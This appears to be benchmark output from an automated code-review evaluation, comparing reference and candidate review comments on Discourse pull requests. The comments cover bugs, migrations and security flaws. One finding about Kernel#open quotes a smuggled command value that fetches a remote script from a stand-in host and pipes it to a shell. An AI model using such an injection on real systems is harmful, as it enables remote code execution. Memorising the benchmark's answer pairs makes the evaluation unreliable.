true_positives.golden_comment: The downsize method is defined twice. The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.
true_positives.matched_candidate:
Duplicate `self.downsize` definition silently discards the 4-argument version

`self.downsize(from, to, max_width, max_height, opts={})` is defined at line 145 and then immediately redefined at line 149 as `self.downsize(from, to, dimensions, opts={})`. Ruby keeps only the last definition, so the width/height form is dead code (it also emits a "method redefined; discarding old definition" warning). Any existing caller using `OptimizedImage.downsize(path, path, 100, 200)` now binds `dimensions = 100` and `opts = 200`, so `opts[:force_aspect_ratio]` in `downsize_instructions` is called on an Integer and raises (`Integer#[]` with a Symbol), or silently produces the geometry `100` instead of `100x200`. The two call conventions must be merged into one method (e.g. accept either a geometry string or width/height).

true_positives.golden_comment: Hardcoding maxSizeKB = 10 * 1024 ignores Discourse.SiteSettings['max_' + type + '_size_kb'], so the client-side limit can diverge from server-side and per-type settings (also applies to the 413 handler below).
true_positives.matched_candidate:
Client-side size validation hard-codes 10 MB and ignores attachment/image size settings

`maxSizeKB` was changed from `Discourse.SiteSettings['max_' + type + '_size_kb']` to a literal `10 * 1024`, so the `type` argument no longer affects the size check. Attachments are not downsized by the new server code and are still validated against `max_attachment_size_kb` in `Upload.create_for`, so a 9 MB attachment now passes client validation, is fully uploaded, and then fails server-side with an error the user was told would not happen. Sites with a `max_image_size_kb` above 10 MB are also newly blocked client-side. The limit should remain derived from the site settings (with the image case using whatever new upload ceiling the server enforces).

false_negatives.golden_comment: Passing 80% as the dimensions can fail for animated GIFs when allow_animated_thumbnails is true, since the animated path uses gifsicle --resize-fit which expects WxH geometry, not a percentage; downsizing would then silently fail.
The loop checking `tempfile.size` may never terminate correctly due to stale cached size, leading to potential infinite loops or incorrect file handling after modifications.

false_positives.candidate:
413 error message reports a hard-coded 10 MB limit

The HTTP 413 handler now shows `max_size_kb: 10240` instead of the configured `max_image_size_kb`. A 413 comes from the web server (nginx `client_max_body_size`), which is independent of this constant, so the message will state a limit that is wrong for any deployment whose proxy limit or image setting differs from 10 MB, confusing users and support.

Animated GIFs lose animation because the animated code path can never trigger

`OptimizedImage.optimize` selects the gifsicle (animation-preserving) instructions only when `from =~ /\.GIF$/i`. The path passed here is `tempfile.path` of a Rack multipart / download temp file, which has no `.gif` extension (e.g. `/tmp/RackMultipart2015...`), so the regex never matches and every oversized animated GIF is run through `convert input[0]`, which keeps only the first frame. Animation is silently destroyed for any GIF above `max_image_size_kb`. Additionally, gating on `SiteSetting.allow_animated_thumbnails` is the wrong setting here: this is the original upload, not a thumbnail.

Downsize loop ignores conversion failures and overwrites the original file in place

The loop calls `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)`, i.e. the ImageMagick/gifsicle input and output are the same path, and the boolean return value (false on non-zero exit or exception, see `OptimizedImage.convert_with`) is discarded. Consequences: (a) if `convert` fails part-way, the user's uploaded file is already truncated/corrupted on disk and is then stored as the upload; (b) if conversion simply fails every time, the loop spins 5 times doing nothing and the oversized file is handed to `Upload.create_for`, which rejects it with a size error the client never predicted. The loop should check the return value, break on failure, and convert into a separate temp file that replaces the original only on success.

Hard-coded 10 MB download cap replaces the configurable limit

`FileHelper.download(url, 10.megabytes, ...)` replaces `SiteSetting.max_image_size_kb.kilobytes`. Sites that configured a larger `max_image_size_kb` can no longer pull images of that size through the API URL path, and sites that deliberately set a small limit now have a 10 MB server-side download/disk/bandwidth exposure that no setting can lower. The cap should be a site setting (e.g. a new `max_upload_size_kb`) rather than a magic constant.

No tests for the new automatic downsizing path or the changed OptimizedImage API

The PR adds a new in-place downsizing loop in `create_upload` and changes/duplicates `OptimizedImage.downsize`/`optimize` signatures, but no specs were added or updated. A single spec for `OptimizedImage.downsize` arity would have caught the duplicate method definition, and a controller/unit spec would cover the oversized-image, conversion-failure and non-raster (SVG/GIF) cases that are currently unverified.

SVG uploads are passed to `convert` and cannot be shrunk by resizing

`FileHelper.is_image?` returns true for `.svg`, so an oversized SVG enters the downsize loop. Resizing a vector/text file by 80% does not reduce its byte size, so all 5 attempts run pointlessly, and running `convert` on it either rasterizes it or produces a file whose content no longer matches the `.svg` filename/extension stored with the upload. SVG (and other non-raster image types) should be excluded from this loop, as `OptimizedImage.create_for` already does for `.svg`.

Up to 5 synchronous ImageMagick + ImageOptim passes per upload run in the web process

For each oversized image the loop may invoke `convert` plus `ImageOptim.new.optimize_image!` (inside `convert_with`) five times, synchronously, on the request/`Scheduler::Defer` thread of the web process. With the upload ceiling now hard-coded at 10 MB, a single user can tie up a defer thread for many seconds of CPU-heavy work per upload, and a handful of concurrent uploads can starve that pool. This work belongs in a background job, or the number of passes should be computed from the size ratio in a single resize rather than iterating.

`optimize` arity change and removal of `dimensions` break external callers

`self.optimize` was changed from `(operation, from, to, width, height, opts)` to `(operation, from, to, dimensions, opts)`, and the public helper `self.dimensions(width, height)` was deleted. Both are class methods on a model that plugins and other code can call; existing calls with five positional args will now raise `ArgumentError`, and calls to `OptimizedImage.dimensions` will raise `NoMethodError`. If the change is intended, the old signatures should be kept as thin wrappers (or all internal/plugin call sites updated).

true_positives.golden_comment: The EmbeddableHost model's before_validation callback calls self.host.sub! to strip http://, https://, and path segments, but if self.host is nil, this raises NoMethodError.
true_positives.matched_candidate:
before_validation raises NoMethodError when host is nil

`self.host.sub!(...)` is executed unconditionally in `before_validation`. If `host` is nil — e.g. `Admin::EmbeddableHostsController#save_host` assigns `params[:embeddable_host][:host]` which may be missing — validation blows up with `NoMethodError: undefined method 'sub!' for nil`, returning a 500 instead of a validation error. Guard with `return if host.blank?` (and add a presence validation). Note also that `sub!` mutates the string in place, which mutates the caller's/params' string object; `sub` with assignment would be safer.

true_positives.golden_comment: The update and destroy methods in Admin::EmbeddableHostsController do not validate the existence of the EmbeddableHost record retrieved by ID. If EmbeddableHost.where(id: params[:id]).first returns nil (i.e., the host does not exist), attempting to call methods on the nil object (e.g., save_host or destroy) will result in a NoMethodError.
true_positives.matched_candidate:
update/destroy crash with 500 when the id does not exist

`EmbeddableHost.where(id: params[:id]).first` can return nil. `update` then calls `save_host(nil)` which does `nil.host = ...` and `destroy` (line 16) calls `nil.destroy`; both raise `NoMethodError` and produce a 500 response. These endpoints should respond 404 (e.g. `find_by!`/`raise Discourse::NotFound`) for unknown ids.

true_positives.golden_comment: record_for_host compares lower(host) = ? but does not normalize the parameter’s case, so mixed‑case referer hosts may fail to match even though comparison intends to be case‑insensitive.
true_positives.matched_candidate:
Case-insensitive host lookup compares against a non-downcased value

`where("lower(host) = ?", host)` lowercases the column but not the argument. Host names in a `Referer` header are case-insensitive and browsers/servers may send mixed case (e.g. `http://EvilTrout.com/page`), in which case `lower(host) = 'EvilTrout.com'` never matches and a legitimately allowed host is rejected with `Discourse::InvalidAccess`. Pass `host.downcase`.

true_positives.golden_comment: Because this migration inserts embeddable_hosts rows with raw SQL, any existing embeddable_hosts values that include http:// or /https:// or path segments won’t go through the EmbeddableHost model’s normalization, so the new host lookup (which compares only the bare host) may fail for migrated data. Consider ensuring that migrated hosts are normalized to the same format as newly created EmbeddableHost records so existing embedding configurations keep working.
true_positives.matched_candidate:
Migrated hosts are inserted unnormalized, so embedding silently stops working after upgrade

Host values are copied straight from the old `embeddable_hosts` site setting with raw SQL, bypassing `EmbeddableHost`'s `before_validation` which strips the scheme and path. The old setting legitimately contained values such as `http://discourse.org` and `https://example.com/1234` (see the removed specs in spec/models/site_setting_spec.rb). `EmbeddableHost.record_for_host` compares `URI(referer).host` (e.g. `discourse.org`) against the stored `host` column, so rows containing `http://discourse.org` will never match and previously-working embeds start raising `Discourse::InvalidAccess` after the upgrade. The migration must normalize each value (strip scheme/path) before inserting.

true_positives.golden_comment: The contents of `category_fabricator.rb` and `embeddable_host_fabricator.rb` have been swapped, resulting in the loss of original category fabricators and potentially causing errors in fabricator usage.
true_positives.matched_candidate:
Fabricator file contents are swapped

`spec/fabricators/category_fabricator.rb` now contains only the `:embeddable_host` fabricator, while the new `spec/fabricators/embeddable_host_fabricator.rb` contains the `:category`, `:diff_category`, `:happy_category` and `:private_category` fabricators. The two file bodies were clearly pasted into the wrong files; this makes the fabricators undiscoverable by filename and will confuse anyone touching category fabrication.

true_positives.golden_comment: The SQL query in the `app/controllers/admin/embeddable_hosts_controller.rb` file uses string interpolation (`'#{h}'`) to insert values, which is vulnerable to SQL injection. It should use parameter binding or proper quoting to prevent this security vulnerability.
true_positives.matched_candidate:
Host value interpolated directly into INSERT statement

`execute "INSERT INTO embeddable_hosts (host, ...) VALUES ('#{h}', ...)"` interpolates a value taken from the database (the old `embeddable_hosts` setting, which was free-form admin input) into SQL without quoting. A value containing a single quote breaks the migration (and could execute arbitrary SQL). Use `quote(h)` / a parameterized insert.

true_positives.golden_comment: The migration accesses execute(...)[0]['id'] without checking if the query returned any rows, which causes a crash when no embed_category setting exists. This can lead to a broken feature when attempting to edit category/host relationships.
true_positives.matched_candidate:
Migration raises NoMethodError when `embed_category` setting row is absent

The migration does `execute("SELECT c.id FROM categories AS c INNER JOIN site_settings AS s ON s.value = c.name WHERE s.name = 'embed_category'")[0]['id']`. `site_settings` only contains rows for settings that have been explicitly changed, and the join additionally requires the stored value to still match a category *name*. For the overwhelming majority of installs (default `embed_category` of `''`, or a renamed/deleted category) the query returns zero rows, so `[0]` is `nil` and `nil['id']` raises `NoMethodError`, aborting the migration and therefore any upgrade. The same unguarded `[0]['value']` pattern is used on line 15 for `uncategorized_category_id`. Both lookups need to handle the empty-result case.

false_positives.candidate:
Host validation regex rejects valid hosts and allows unmatchable ones

The format regex requires `\.[a-z]{2,5}` at the end, which rejects hosts admins can legitimately want to embed from: single-label hosts (`localhost`), TLDs longer than 5 characters (`example.engineering`, `example.technology`), and IP addresses. Conversely the regex permits an optional `:port`, but `record_for_host` compares against `URI(...).host`, which never contains a port, so a saved host like `example.com:3000` can never match a referer and silently never allows anything. The old `host_list` site setting had no such restrictions, so this is a functional regression.

New mutating admin endpoints have no behavioural tests

The only assertion is that the class inherits from `Admin::AdminController`. There is no coverage for `create`/`update`/`destroy` (including the default-to-uncategorized behaviour, the 500-on-missing-record paths noted above, invalid host handling) nor for access control (non-admin/anonymous requests). The same applies to spec/controllers/admin/embedding_controller_spec.rb, which does not exercise `show`/`update` at all. Given these endpoints create the data that gates framing/embedding (a security-relevant allowlist), they should be tested.

No uniqueness validation on host

Nothing prevents two `EmbeddableHost` rows with the same host (the migration creates no unique index either, and `before_validation` normalizes `http://example.com` and `example.com` to the same value). `record_for_host` then arbitrarily takes `.first`, so an admin editing the category of a duplicated host can see no effect on which category embedded topics are created in. Add a uniqueness validation (case-insensitive) and/or a unique index.

PUT /admin/customize/embedding is a no-op that pretends to save

`Admin::EmbeddingController#update` ignores the request body entirely and just re-renders the current state, so the route registered in config/routes.rb (`put "customize/embedding"`) silently discards any submitted data while returning 200. The admin controller's `saveChanges` action (app/assets/javascripts/admin/controllers/admin-embedding.js.es6 line 6) calls `embedding.update({})` against it, though nothing in embedding.hbs triggers that action. Either implement the update or remove the route/action so the API does not advertise behaviour it does not have.

Test named "is false if embeddable_host is blank" no longer tests that

`Topic#expandable_first_post?` no longer consults embeddable hosts at all (the `SiteSetting.embeddable_hosts.present?` check was removed), so this example passes only because `embed_truncate` defaults to false and `has_topic_embed?` is false for a fabricated topic — not because no host exists. The name is now misleading and the example asserts nothing about hosts; it should be renamed/removed.

`*_ids` hydration deletes the ids even when the sideloaded collection is missing

In `_hydrateEmbedded`, any key matching `(.+)_ids` is now replaced: `obj[pluralize(subType)] = obj[k].map(id => _lookupSubType(...))` and `delete obj[k]` is executed unconditionally. Unlike the singular branch (which only deletes the key when hydration succeeded), this means that for any REST-serialized payload containing an `*_ids` array that is not sideloaded in the root, the original ids are lost and the model gets an array full of `undefined`. Also, if the server sends `null` for such a key, `obj[k].map` throws `TypeError: Cannot read property 'map' of null`. (`hydrated || []` on the next line is dead code since `map` always returns an array.) Only replace the key when every lookup resolves, and guard against non-array values.

`create_table ... force: true` can drop an existing table, and the migration is not reversible

`force: true` issues a DROP TABLE IF EXISTS before creating, so re-running this migration (or running it on a database that already has an `embeddable_hosts` table, e.g. created by a plugin) silently destroys existing rows. In addition, the body is defined in `change` but contains `execute` statements (data copy and `DELETE FROM site_settings`), which Rails cannot reverse: `rake db:rollback` will drop the table without restoring the deleted site settings. Use `def up` (plus an explicit `down`) and drop `force: true`.

`type.replace('_', '-')` only replaces the first underscore

`String.prototype.replace` with a string pattern replaces a single occurrence, so `basePath` normalizes `embeddable_host` correctly but a type with more than one underscore (e.g. `some_admin_model`) still fails the `ADMIN_MODELS` lookup and would be routed to `/` instead of `/admin/`. Use `/_/g` (or `Ember.String.dasherize`).

true_positives.golden_comment: logic: Potential nil pointer exception - if no TopicUser record exists, tu will be nil and calling methods on it will crash
true_positives.matched_candidate:
Nil TopicUser causes 500 in unsubscribe action

`TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` can return nil (no `topic_users` row exists for this user/topic — e.g. the row was never created, was removed, or a different logged-in user than the email recipient opens the link). The next line calls `tu.notification_level`, raising `NoMethodError` and producing a 500 error page for anyone clicking the unsubscribe link in that situation. The action needs to handle the missing row (e.g. create it via `TopicUser.change`) or respond gracefully.

false_negatives.golden_comment: Typo in property name: 'stopNotificiationsText' should be 'stopNotificationsText' (missing 'n' in 'Notifications')

false_positives.candidate:
No specs for the new unsubscribe endpoint or Topic#unsubscribe_url

The new `TopicsController#unsubscribe` action (slug redirect, missing-`TopicUser` path, which notification level results, access control for topics the user cannot see) and `Topic#unsubscribe_url` have no controller/model specs. The only test change is passing `unsubscribe_url` into `Email::MessageBuilder` so the existing unsubscribe-link spec keeps passing; nothing asserts that the per-topic unsubscribe URL actually appears in the email body or that the new endpoint behaves correctly, so the regressions noted above (nil TopicUser 500, toggle-on-refresh) would not be caught.

State-changing GET action with CSRF protection effectively disabled `unsubscribe` changes persistent user state (`topic_users.notification_level`) on a GET request, and `check_xhr` is skipped for it (line 32). Rails' `protect_from_forgery` does not apply to GET, so any third-party page can embed `` (or a link/prefetch) and silently mute or downgrade the notification level of any logged-in visitor for an arbitrary topic. Email scanners and link prefetchers in mail clients will also trigger it without the user ever clicking. The unsubscribe should either be performed through a non-GET request with CSRF token, or be gated by a one-time signed key embedded in the email link (as is done for the digest unsubscribe key).

Unsubscribe GET endpoint toggles notification level, so a reload/prefetch mutes the topic

`TopicsController#unsubscribe` is reached by a plain GET from an email link, but the body is a toggle: if the current level is above `regular` it is lowered to `regular`, otherwise it is set to `muted`. The request is therefore not idempotent. A user who clicks the email link and then refreshes the page (or whose browser/email client fetches the URL twice, or who clicks the link in two different notification emails for the same topic) ends up fully muted even though they only intended one downgrade. The 301 redirect added at line 102 also makes it easy for the URL to be re-requested. The action should set a single, deterministic target level instead of toggling (and preferably be a POST/PUT with an explicit confirmation).

Unsubscribe link from email silently fails for users who are not logged in

`unsubscribe` is added to the `ensure_logged_in` filter list, but the link is delivered by email and will frequently be opened in a browser/webview where the user has no Discourse session. In that case `Discourse::NotLoggedIn` is raised and the HTML request is bounced (to the homepage/login) without performing the unsubscribe and without telling the recipient why, so the email's promise "To stop receiving notifications about this particular topic, click here" does not hold. Consider a signed key in the URL so the action works without a session, or at least redirect back to the unsubscribe URL after login with an explanatory message.

Unsubscribe page text claims notifications are stopped even when the level was only downgraded to regular `topic.unsubscribe.stop_notifications` reads "You will stop receiving notifications for {{title}}." and is rendered unconditionally, but the server only moves watching/tracking down to `regular` on the first visit. At `regular` the user still receives notifications for replies to their posts and mentions in that topic, so the page tells the user something that is not true. The message should reflect the resulting notification level (or the server should actually mute when the message says notifications stop).

Unsubscribe writes notification_level directly, bypassing TopicUser.change bookkeeping

Setting `tu.notification_level` and calling `tu.save!` skips everything `TopicUser.change` does: it does not set `notifications_changed_at`/`notifications_reason_id` and does not publish the `/topic/:id` `notification_level_change` MessageBus message. Two concrete consequences: (1) any open client tab keeps showing the stale notification level, and (2) because `notifications_reason_id` stays `nil` (its common value when the level was never user-set), `TopicUser.update_last_read` will auto-track the topic again the next time the user views it, silently undoing the unsubscribe. Use `TopicUser.change(current_user.id, topic_id, notification_level: ...)` instead.

unsubscribe_link now requires %{unsubscribe_url}, which will break other mailers

`Email::MessageBuilder#body` and `#html_part` interpolate `I18n.t('unsubscribe_link', template_args)` for every email built with `add_unsubscribe_link: true`. Adding the mandatory `%{unsubscribe_url}` placeholder means any such caller that does not supply `unsubscribe_url` raises `I18n::MissingInterpolationArgument` and the email fails to send; only `UserNotifications#send_notification_email` was updated to pass it (and the message_builder spec had to be changed for exactly this reason). Either make the topic link conditional (e.g. a separate key only appended when `unsubscribe_url` is present) or audit/update every mailer that sets `add_unsubscribe_link`.

true_positives.golden_comment: BlockedEmail.should_block_email? method has side effects during a read operation - it updates statistics even when just checking if an email should be blocked. This could cause race conditions in concurrent environments and makes the method name misleading.
true_positives.matched_candidate:
Validator side effect causes match_count to be incremented more than once per signup

`validate_each` calls `BlockedEmail.should_block?`, which writes to the database. Validation is not idempotent for callers: `UsersController#create` calls `user.valid?` (line 168) and then `user.save` (line 172), so the blocked-email counters are incremented twice for a single sign-up attempt, and any other code path that validates a user more than once inflates the counters further. Counting should happen once per attempt, outside the validation callback.

true_positives.golden_comment: The case-sensitive email lookup in `BlockedEmail.should_block?` creates a bypass risk, allowing 'User@Example.com' to bypass a block on 'user@example.com'. This can lead to unauthorized access to blocked users.
true_positives.matched_candidate:
Blocked-email lookup is case sensitive, so the block list is trivially bypassed

`BlockedEmail.should_block?` looks the address up with `BlockedEmail.where(email: email).first`, an exact, case-sensitive comparison, and nothing in the model or the migration normalizes the stored address either. Sign-up emails are not downcased before validation (`User.new_from_params` assigns `params[:email]` verbatim), so an address blocked as `bad@spam.com` passes validation when submitted as `Bad@Spam.com`. The unique index on `blocked_emails.email` is also case sensitive, so duplicate case variants can be stored. Both the stored value and the lookup should be downcased (or the comparison made case-insensitive) for the feature to actually block anything.

false_negatives.golden_comment: The regex pattern @(#{domains}) in email_in_restriction_setting? method only matches domain suffixes, not full domains with proper boundary anchoring. An attacker can register evil.example.com to bypass a whitelist entry for example.com.

false_positives.candidate:
Mutable array declared on the controller prototype is shared between instances

`rejectedEmails: Em.A([])` puts a single array object on the class prototype, so every instance created from `Discourse.CreateAccountController` mutates the same array via `pushObject`. If more than one instance is ever created (or the container is reset, e.g. in tests), rejected emails leak across instances and are never cleared. The array should be initialised per instance (e.g. in `init`) or stored as `null` and lazily created.

New validator spec only covers the stubbed blocked-email branch

The spec stubs `BlockedEmail.should_block?` entirely, so nothing exercises the real lookup (including the case-sensitivity problem), nothing verifies that a `User` with a blocked email actually fails to save, and the whitelist/blacklist branches that were moved out of `User#email_validator` into this new class have no coverage here. A regression in the moved whitelist/blacklist code or in the interaction between the validator and `BlockedEmail` would not be caught.

Non-atomic match_count increment loses updates and silently ignores save failures

`record.match_count += 1; record.save` is a read-modify-write: two concurrent sign-up attempts with the same blocked address both read the same value and write the same incremented value, so one match is lost. Additionally the return value of `save` is discarded, so a failed save (e.g. a validation error on a legacy row with a blank email) silently drops the statistics. Use an atomic SQL increment (`increment!`/`update_all("match_count = match_count + 1")`) instead.

Server-rejected email is reported to the user as "invalid"

When an email is in `rejectedEmails` the field validation shows `I18n.t('user.email.invalid')`, i.e. the "email address is invalid" message, even though the server rejected it because it is blocked or already taken. After the flash message disappears the user is left with a message telling them their address is malformed, which will send them down the wrong path. The server-provided error message (`result.errors.email`) should be surfaced instead of a generic format error.

action_type is NOT NULL with no database default

`action_type` is declared `null: false` without a default; the default value is only applied by the model's `before_validation :set_defaults`. The spec for this feature explicitly anticipates the table being "manually loaded with some emails" — any such bulk insert or raw SQL insert that omits `action_type` will fail with a NOT NULL violation. Adding `default: 1` (the `:block` value) to the column would make the intended default hold at the database level.

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on a site-setting URL allows command execution and SSRF

`open(SiteSetting.feed_polling_url)` uses `Kernel#open`, which executes a subprocess when the argument starts with `|` (e.g. `feed_polling_url = "|curl evil.com/x.sh|sh"`), and will happily read local files/internal addresses otherwise. Even though the setting is admin-only, a single compromised/misconfigured setting turns into remote code execution on the Sidekiq host. Use `URI.parse(url).open` (or an explicit HTTP client) and validate the scheme is http/https. The same concern applies to `open(url)` in `TopicEmbed.import_remote`.

true_positives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.
true_positives.matched_candidate:
postMessage origin check uses substring matching

`if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any `e.origin` that is a substring of the configured `discourseUrl` (and also silently accepts `e.origin === ''`, since `indexOf('')` is 0). This is not an origin comparison; it should compare `e.origin` against the exact origin derived from `discourseUrl`. The current check weakens the only authentication on the resize messages and will also mis-handle a `discourseUrl` without a trailing slash (line 7 concatenates `"embed/best"` directly onto it, producing a wrong iframe src).

true_positives.golden_comment: The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.
true_positives.matched_candidate:
`<%- end if %>` typo makes the header conditional depend on the logo link expression

Line 6 reads `<%- end if %>` instead of `<%- end %>`. The generated template code becomes `end if` followed by the next emitted statement, which Ruby parses as a modifier-`if` whose condition is the *next* expression (the `link_to(image_tag(SiteSetting.logo_url ...))` on line 8). As a result the logo is evaluated/appended before the Discussion/Start-Discussion button, the ordering in the rendered header is reversed, and the whole if/else block is gated on the truthiness of a side-effecting buffer append. It is also one token away from an outright `SyntaxError` in this template (which would 500 the main embed action). Change it to `<%- end %>`.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
Nil/absent feed item content aborts the whole poll

`i.content.scrub` assumes every item exposes `content`. Plain RSS 2.0 feeds commonly only provide `description` (SimpleRSS returns `nil` for `content`/`content_encoded`), so this raises `NoMethodError` on `nil`. Because the loop has no per-item rescue and the job is declared `sidekiq_options retry: false`, a single such item silently aborts the import of the entire feed (and all later items). Fall back to `description`/`summary` and wrap each item so one bad entry does not kill the run.

false_negatives.golden_comment: postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

The TopicEmbed.import method is susceptible to a NoMethodError if the contents parameter is nil when attempting to append a string, and an XSS vulnerability due to unescaped url interpolation in the generated HTML.

An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.

false_positives.candidate:
Already-committed migration changed to `create_table ... force: true`

Editing an existing migration to add `force: true` means that on any database where `top_topics` exists but this migration version is not recorded (partially migrated/restored DB, schema loaded from schema.rb), running migrations will silently `DROP TABLE top_topics` and recreate it, losing data. Changing a released migration also makes checksum/history divergence between installs. If a reset is really needed, add a new migration instead.

Feed content is stored as pre-cooked HTML with no sanitization (stored XSS)

`poll_feed` takes `i.content` straight from the remote RSS/Atom feed, runs `CGI.unescapeHTML` on it and hands it to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` (app/models/post.rb:133) then returns `raw` verbatim as `cooked`, completely bypassing PrettyText/the HTML sanitizer. The resulting HTML is rendered unescaped both in the Ember client (`{{{cooked}}}`) and in app/views/embed/best.html.erb (`raw post.cooked`). Any `<script>`, `onerror=`, `<iframe>` etc. present in the feed (compromised blog, feed that republishes user-submitted content, man-in-the-middle on a plain-HTTP feed URL) executes in the browsers of all forum users, including admins. The feed HTML should be run through the same sanitizer/whitelist that `import_remote` applies via Readability's tag/attribute whitelist before being stored as cooked output.

New embed.css/embed.js assets are not added to the precompile list

`stylesheet_link_tag 'embed'` references the newly added `app/assets/stylesheets/embed.css.scss`, and `app/assets/javascripts/embed.js` is meant to be served to third-party sites, but neither file is reachable from `application.css`/`application.js` and the PR does not add them to `config.assets.precompile` in `config/application.rb`. With Sprockets in production (`assets.compile = false`) this raises an "asset is not present in the asset pipeline / not precompiled" error, so the embed page will 500 and the embed snippet will 404 after deploy.

No coverage renders the new embed views

The controller spec stubs `TopicView.new` (returning nil) and Rails controller specs do not render views unless `render_views` is enabled, so neither `embed/best.html.erb` nor `layouts/embed.html.erb` is ever exercised. That is why the `<%- end if %>` defect on best.html.erb:6 and the `@topic_view` usage are unverified. Add a `render_views` example with a real topic so template errors are caught.

One Sidekiq job enqueued per request for an unknown embed_url

Every request for an embed_url without a topic enqueues `Jobs::RetrieveTopic`; throttling happens only inside the job (`TopicRetriever#retrieved_recently?`). Since the endpoint is anonymous and unauthenticated (only a Referer check), a client hitting `embed/best` in a loop—or the loading page's unconditional 30s reload for many visitors—can flood the queue with jobs that all immediately no-op. Consider rate limiting the enqueue (e.g. check the same redis key before enqueueing).

Re-import crashes when the embedded post has been deleted

In the update branch, `post = embed.post` is used directly by `PostRevisor.new(post)`. `Post` includes `Trashable`, so a soft-deleted (or hard-deleted) post makes `embed.post` return `nil`, and `PostRevisor#revise!` then raises `NoMethodError` on `nil.raw`. Any topic/post that a moderator deletes will therefore make every subsequent feed poll or embed retrieval for that URL blow up (and, since `Jobs::PollFeed` has `retry: false` and no per-item rescue, abort the rest of the feed). Guard for a missing post and either skip or recreate the topic.

SETNX followed by EXPIRE can leave a permanent throttle key

`$redis.setnx(retrieved_key, "1")` and `$redis.expire(retrieved_key, 60)` are two round trips; if the process dies or the connection drops between them the key exists with no TTL and that embed URL is throttled forever, so the topic can never be retrieved. Use a single atomic `set(key, "1", ex: 60, nx: true)`.

Two PollFeed guard tests pass vacuously

"requires feed_polling_url" (line 18) and "requires embed_by_username" (line 24) only stub the one setting they are about; `feed_polling_enabled?` is left at its default, which is `false` in config/site_settings.yml. The first condition in `execute` therefore short-circuits and `poll_feed` would not be called even if the url/username guards were removed entirely, so these two examples assert nothing. Stub `feed_polling_enabled?` to true in both, and add coverage for `poll_feed` itself (item parsing, nil content, import call), which is currently untested.

`import_remote` calls `open(url)` without requiring open-uri

`import_remote` only does `require 'ruby-readability'`; it never requires `open-uri`. If nothing else in the process has loaded open-uri (e.g. `app/jobs/scheduled/poll_feed.rb`, which does require it, has not been autoloaded yet), `open(url)` falls back to `Kernel#open` as a file open and raises `Errno::ENOENT` for an http URL. This path is reached from `Jobs::RetrieveTopic` -> `TopicRetriever#fetch_http` and from the disqus thor task, so embed retrieval can fail non-deterministically depending on load order. Add `require 'open-uri'` (preferably `URI.parse(url).open`).

`import` mutates the caller's `contents` string

`contents << "\n<hr>..."` appends the "Imported from" footer in place rather than building a new string. Callers that reuse or memoize the string (e.g. a `let(:contents)` in specs, or any retry loop) will get the footer appended repeatedly, and the computed `content_sha1` will differ run to run for identical input, causing spurious "content changed" revisions. A frozen string argument would raise `RuntimeError`. Use `contents = contents + "..."` / `contents.dup`.

embed_url limited to 255 chars with a unique index

`t.string :embed_url` defaults to varchar(255) in Postgres and is also the unique index column. Feed/article URLs regularly exceed 255 characters (tracking params, long slugs), which makes `TopicEmbed.create!` raise `PG::StringDataRightTruncation` inside the import transaction and permanently prevents embedding those pages. Use `:text` (with an index on the value or a hash) or document the limit and truncate/validate explicitly.

true_positives.golden_comment: -webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.
true_positives.matched_candidate:
order() mixin maps 0-based `order` onto 1-based legacy ordinal-group

The new `order($val)` mixin emits the same number for `-webkit-box-ordinal-group` / `-moz-box-ordinal-group` as for the standard `order` property. These are not equivalent: in the 2009 box spec `box-ordinal-group` is 1-based (initial value 1) while `order` is 0-based (initial value 0). Consequences: (a) `@include order(0)` emits `-webkit-box-ordinal-group: 0`, which is invalid and is dropped, and (b) any element given `order(1)` intending it to be placed *after* non-ordered siblings will instead be grouped with them in legacy-box engines, because unordered siblings default to ordinal-group 1. The legacy lines should use `$val + 1` (and the mixin should guard against `$val < 0`). This matters for the new usages `@include order(2)` on `.extra-info-wrapper` and `@include order(3)` on `.d-header .panel`, which only accidentally line up today because `.title` has no explicit order.

false_negatives.golden_comment: Mixing float: left with flexbox causes layout issues. Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.
-ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.

false_positives.candidate:
Header .panel right alignment relies on auto margins, which the legacy box fallback does not support

`.panel` previously used `float: right`; it now relies on `margin-left: auto` inside the flex `.contents`. Auto margins do not distribute free space in the 2009 flexbox (`display: -webkit-box` / `-moz-box`) that the new `flexbox()` mixin emits as a fallback, and there is no `-webkit-box-pack: end` equivalent. In engines that pick the legacy box display (old WebKit/Gecko builds) the panel with the search/user/hamburger icons will sit flush against the title instead of at the right edge of the header, i.e. a visible header regression for those browsers. Either add the legacy packing properties or drop the legacy `display` fallbacks so those browsers keep the float-based layout.

Making .small-action a flex container breaks right alignment of its button

